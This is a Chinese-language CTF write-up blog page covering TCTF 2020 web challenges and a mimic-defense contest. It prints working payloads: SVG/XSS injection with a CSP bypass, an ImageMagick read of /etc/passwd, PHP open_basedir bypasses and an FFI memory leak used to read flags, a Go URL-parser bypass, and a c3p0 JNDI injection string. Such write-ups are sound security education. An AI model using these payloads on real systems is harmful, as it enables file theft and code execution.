<p>访问对应的png界面时: <a href="http://pwnable.org:5000//image/ZpVQfl/png" target="_blank" rel="noopener">http://pwnable.org:5000//image/ZpVQfl/png</a> </p>
<p>返回报错</p>
<pre><code>{&quot;error&quot;: &quot;Convert exception: unable to open image `previews/testting&#39;: No such file or directory @ error/blob.c/OpenBlob/2874&quot;}</code></pre><p>根据报错猜测是ImageMagick 来转换成对应的后缀</p>
<p>fuzz后缀后发现：</p>
<pre><code>http://pwnable.org:5000/image/FdrpgF/htm</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200643.png" alt="image857"></p>
<p>根据preview返回的数据，后端估计是先生成一个svg,再转化为其他的格式</p>
<p>我们再看看他们是如何传递并表示表情的</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200926.png" alt="image1001"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629201154.png" alt="image1085"></p>
<p>发现</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629201349.png" alt="image1173"></p>
<p>修改[]里的值可以逃出引号的限制</p>
<pre><code>[{&quot;type&quot;:0,&quot;message&quot;:&quot;[../../image/mOFJpl/svg#\&quot;&gt;&lt;/g&gt;&lt;/svg&gt;&lt;script srsrcc=\&quot;/image/kOmxqd/jpg?callback=aaa\&quot;&gt;&lt;/script&gt;&lt;svg&gt;&lt;g&gt;&lt;image xlink:href=\&quot;]&quot;}]</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629225818.png" alt="image1437"></p>
<p>搜索<strong>ImageMagick convert ctf</strong> 发现，ImageMagick convert可以<a href="https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/" target="_blank" rel="noopener">读取文件</a></p>
<p>构造:</p>
<pre><code>------WebKitFormBoundaryHJ88AZN7
Content-Disposition: form-data; name=&quot;data&quot;

[{&quot;type&quot;:0,&quot;message&quot;:&quot;[\&quot; href=\&quot;text:/etc/passwd\&quot; onerror=\&quot;//]&quot;}]
------WebKitFormBoundaryHJ88AZN7--</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629230827.png" alt="image1845"></p>
<p>测试常见的文件后找到源文件：app.py</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629230936.png" alt="image1953"></p>
<p>这里我们重点关注responseJSON和 secret这两个函数</p>
<h3 id="第二部分-xss管理员"><a href="#第二部分-xss管理员" class="headerlink" title="第二部分 xss管理员"></a>第二部分 xss管理员</h3><p>secret是让我们xss管理员，但是存在csp:</p>
<pre><code>img-src * data:; default-src &#39;self&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;self&#39;</code></pre><p>responseJSON可以让我们在json数据前加上xxx=,结合报错返回的数据是json格式，如果我们能控制报错信息，我们就能绕过csp</p>
<p>前文发现 ImageMagick 的那个接口(share)刚好可以控制报错信息</p>
<pre><code>previewid=`test&quot;},alert(1),{&quot;2&quot;:&quot;</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231535.png" alt="image2409"></p>
<p>接着就是让htm包含它：</p>
<pre><code>[{&quot;type&quot;:0,&quot;message&quot;:&quot;[../../image/mOFJpl/svg#\&quot;&gt;&lt;/g&gt;&lt;/svg&gt;&lt;link rel=\&quot;stylesheet\&quot; href=\&quot;/static/css/bootstrap.min.css\&quot;&gt;&lt;script ssrcrc=\&quot;/static/js/jquery-3.5.1.min.js\&quot;&gt;&lt;/script&gt;&lt;script ssrcrc=\&quot;/static/js/bootstrap.min.js\&quot;&gt;&lt;/script&gt;&lt;script srsrcc=\&quot;/image/kOmxqd/jpg?callback=aaa\&quot;&gt;&lt;/script&gt;&lt;svg&gt;&lt;g&gt;&lt;image xlink:href=\&quot;]&quot;}]</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231806.png" alt="image2848"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231854.png" alt="image2936"></p>
<h3 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h3><p>一叶飘零大大的wp：</p>
<p> <a href="https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#Wechat-Generator" target="_blank" rel="noopener">https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#Wechat-Generator</a> </p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><pre><code> &lt;?php
if (isset($_GET[&#39;rh&#39;])) {
    eval($_GET[&#39;rh&#39;]);
} else {
    show_source(__FILE__);
}</code></pre><p>很简单的源代码,首先查看phpinfo:</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629232130.png" alt="image3265"></p>
<p>open_basedir: /var/www/html 且该目录不可写，twitter上那个绕过open_basedir的方法就没用了</p>
<p>利用</p>
<pre><code>$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f){echo($f-&gt;__toString().&#39; &#39;);};</code></pre><p>列目录：</p>
<pre><code>bin dev etc flag.h flag.so home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var</code></pre><p>看到flag.h+flag.so+ffi猜测是要用ffi来加载flag.h然后执行其中的方法，</p>
<p>测试后发现 ffi::load 无视open_basedir ,但是只能加载 /flag.h</p>
<p>当我们又不知道flag.h中的函数定义。。。。。。</p>
<p>后来这题是因为别人把题目打穿了，全场绕过open_basedir，读取了flag</p>
<h2 id="noeasyphp"><a href="#noeasyphp" class="headerlink" title="noeasyphp"></a>noeasyphp</h2><p>这题听说是因为出题人因为easyphp重出的题目</p>
<p>这里就要直面刚刚明明无法读取flag.h又要了解flag.h中的函数声明</p>
<p>因为这里有ffi，可以直接操作系统的底层，我们试试内存泄露</p>
<pre><code class="php">$c=FFI::load(&quot;/flag.h&quot;);
$b=FFI::cast(&quot;void *&quot;,FFI::new(&quot;int[1]&quot;,false));
$a=FFI::string($b-400000,400000);
var_dump($a);
</code></pre>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630000339.png" alt="image4044"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630000414.png" alt="image4128"></p>
<p>好玩.jpg</p>
<h2 id="Cloud-Computing"><a href="#Cloud-Computing" class="headerlink" title="Cloud Computing"></a>Cloud Computing</h2><pre><code class="php">&lt;?php mkdir(&#39;/var/www/html/sandbox/362495b25219141379062025d7d6d775772e6b7d/test2&#39;);chdir(&#39;/var/www/html/sandbox/362495b25219141379062025d7d6d775772e6b7d/test2&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo(file_get_contents(&#39;/flag&#39;));</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/06/30/tctf2020/">http://blog.ccreater.top/2020/06/30/tctf2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/06/30/tctf2020/" data-id="ckc0pf8nx0000asv01sp72qjd" data-title="tctf2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-拟态防御记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/" class="article-date">
  <time class="dt-published" datetime="2020-06-23T01:27:13.866Z" itemprop="datePublished">2020-06-23</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/">拟态防御记录</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p> ./sancheck.php</p>
<pre><code class="go">package main

import (
    &quot;fmt&quot;
    &quot;io/ioutil&quot;
    &quot;log&quot;
    &quot;net/http&quot;
    &quot;net/url&quot;
    &quot;strings&quot;
)

var (
    secret   = &quot;xiaomo.wabzsy&quot;
    banner   = &quot;Golang HTTP Server (v2.3.3)&quot;
    template = `&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;San Check&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;form method=&quot;POST&quot;&gt;
            &lt;input type=&quot;text&quot; name=&quot;url&quot; /&gt;
            &lt;input type=&quot;submit&quot; value=&quot;淦!&quot; /&gt;
        &lt;/form&gt;
        &lt;pre&gt;
%s
        &lt;/pre&gt;
    &lt;/body&gt;
    &lt;!-- ./sancheck.php --&gt;
&lt;/html&gt;`
)

func SanCheck(input string) error {
    u, err := url.Parse(input)

    if err != nil {
        return err
    }

    if u.Scheme != &quot;http&quot; {
        return fmt.Errorf(&quot;err: Invalid Scheme [%s]&quot;, u.Scheme)
    }

    if u.Opaque != &quot;&quot; {
        return fmt.Errorf(&quot;err: WHAT AER YOU DOING ?!!! (%s)&quot;, u.Opaque)
    }

    if u.Hostname() != &quot;127.0.0.1&quot; {
        return fmt.Errorf(&quot;err: Invalid Hostname [%s]&quot;, u.Hostname())
    }

    if u.Port() != &quot;&quot; &amp;&amp; u.Port() != &quot;80&quot; {
        return fmt.Errorf(&quot;err: Invalid Port [%s]&quot;, u.Port())
    }

    if u.User == nil {
        return fmt.Errorf(&quot;err: Authorization Required&quot;)
    }

    if u.User.Username() != &quot;root&quot; {
        return fmt.Errorf(&quot;err: Invalid Username [%s]&quot;, u.User.Username())
    }

    if password, set := u.User.Password(); !set || password != &quot;P@ssw0rd!&quot; {
        return fmt.Errorf(&quot;err: Invalid Password [%s]&quot;, password)
    }

    if u.RequestURI() != &quot;/flag.php&quot; {
        return fmt.Errorf(&quot;err: Invalid RequestURI [%s]&quot;, u.RequestURI())
    }

    if u.Fragment != &quot;&quot; {
        return fmt.Errorf(&quot;err: Invalid Fragment [%s]&quot;, u.Fragment)
    }

    if !strings.Contains(u.String(), &quot;&#39;Pwned!&#39;&quot;) {
        return fmt.Errorf(&quot;err: San Check failed&quot;)
    }

    return nil
}

func DefaultHandler(w http.ResponseWriter, req *http.Request) {

    input := req.PostFormValue(&quot;url&quot;)

    if input == &quot;&quot; {
        Response(w, template, &quot;Where is the flag?&quot;)
        return
    }

    if err := SanCheck(input); err == nil {
        req, _ := http.NewRequest(&quot;GET&quot;, input, nil)
        req.Header.Add(&quot;Secret&quot;, secret)
        if resp, err := (&amp;http.Client{}).Do(req); err == nil {
            if body, err := ioutil.ReadAll(resp.Body); err == nil {
                Response(w, template, string(body))
            }
            _ = resp.Body.Close()
        } else {
            Response(w, template, err.Error())
        }
    } else {
        Response(w, template, err.Error())
    }
}

func FlagHandler(w http.ResponseWriter, req *http.Request) {
    if strings.Join(req.Header[&quot;Secret&quot;], &quot;&quot;) != secret {
        Forbidden(w)
    } else if !strings.HasPrefix(req.RemoteAddr, &quot;127.0.0.1&quot;) {
        Forbidden(w)
    } else {
        Response(w, &quot;&lt;h1&gt;%s&lt;/h1&gt;&quot;, readFlag())
    }
}

func readFlag() string {
    if bs, err := ioutil.ReadFile(&quot;./flag.txt&quot;); err == nil {
        return string(bs)
    } else {
        return fmt.Sprintf(&quot;Unable to read flag.txt, please contact technical support.(%s)&quot;, err.Error())
    }
}

func CodeHandler(w http.ResponseWriter, _ *http.Request) {
    w.Header().Set(&quot;Content-Type&quot;, &quot;text/plain; charset=utf-8&quot;)
    w.Header().Set(&quot;Server&quot;, banner)
    if bs, err := ioutil.ReadFile(&quot;main.go&quot;); err == nil {
        _, _ = w.Write(bs)
    } else {
        _, _ = w.Write(
            []byte(
                fmt.Sprintf(&quot;Unable to read main.go, please contact technical support.(%s)&quot;,
                    err.Error(),
                ),
            ),
        )
    }
}

func Forbidden(w http.ResponseWriter) {
    w.WriteHeader(403)
    Response(w, &quot;&lt;h1&gt;%s&lt;/h1&gt;&quot;, &quot;403 Forbidden&quot;)
}

func Response(w http.ResponseWriter, tpl string, response string) {
    w.Header().Set(&quot;Content-Type&quot;, &quot;text/html; charset=utf-8&quot;)
    w.Header().Set(&quot;Server&quot;, banner)
    if _, err := fmt.Fprintf(w, tpl, response); err != nil {
        log.Println(err)
    }
}

func main() {
    http.HandleFunc(&quot;/&quot;, DefaultHandler)
    http.HandleFunc(&quot;/flag.php&quot;, FlagHandler)
    http.HandleFunc(&quot;/sancheck.php&quot;, CodeHandler)
    log.Fatal(http.ListenAndServe(&quot;:80&quot;, nil))
}</code></pre>
<p>根据issue<a href="https://github.com/golang/go/issues/29098" target="_blank" rel="noopener">https://github.com/golang/go/issues/29098</a> 绕过</p>
<p><code>http://root:P@ssw0rd!@127.0.0.1]&#39;Pwned!&#39;]:80/flag.php#</code></p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><a href="mailto:ccreater@163.com">ccreater@163.com</a>  E6N0HT aa05940594</p>
<p>cmd={“/expandocolumn/add-column”:{}}&amp;p_auth=Gyr2NhlX&amp;formDate=1585307550388&amp;tableId=1&amp;name=1&amp;type=1&amp;+defaultData:com.mchange.v2.c3p0.JndiRefForwardingDataSource={“jndiName”:”ldap://127.0.0.1:1389/Object”,”loginTimeout”:0}</p>
<h2 id="白盒拟态路由"><a href="#白盒拟态路由" class="headerlink" title="白盒拟态路由"></a>白盒拟态路由</h2><pre><code>vtysh
conf t
ip route 200.14.1.0/24 x.x.x.x</code></pre><h2 id="白盒拟态域名服务器"><a href="#白盒拟态域名服务器" class="headerlink" title="白盒拟态域名服务器"></a>白盒拟态域名服务器</h2><p>上传busybox 来使用nslookup等命令</p>
<pre><code>cat /etc/name.conf
根据配置修改
sudo /usr/local/bind-9.11.19/bin/named/named
busybox nslookup www.test.com 172.29.126.2 看结果</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/06/23/拟态防御记录/">http://blog.ccreater.top/2020/06/23/拟态防御记录/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/" data-id="ckbr91buj0000d0v08mwg1evw" data-title="拟态防御记录" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li></ul>

    </footer>
  </div>
  
</article>





  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&lt;- Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/3/">Next -&gt;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/">巅峰极客2020wp</a>
          </li>
        
          <li>
            <a href="/2020/10/20/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/">LFI利用php自带的pearcmd.php直接RCE</a>
          </li>
        
          <li>
            <a href="/2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">2020西湖论剑</a>
          </li>
        
          <li>
            <a href="/2020/10/15/Service%20Worker/">Service Worker</a>
          </li>
        
          <li>
            <a href="/2020/10/05/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/">FastJson1.2.24调试记录_复现</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":100},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
</html>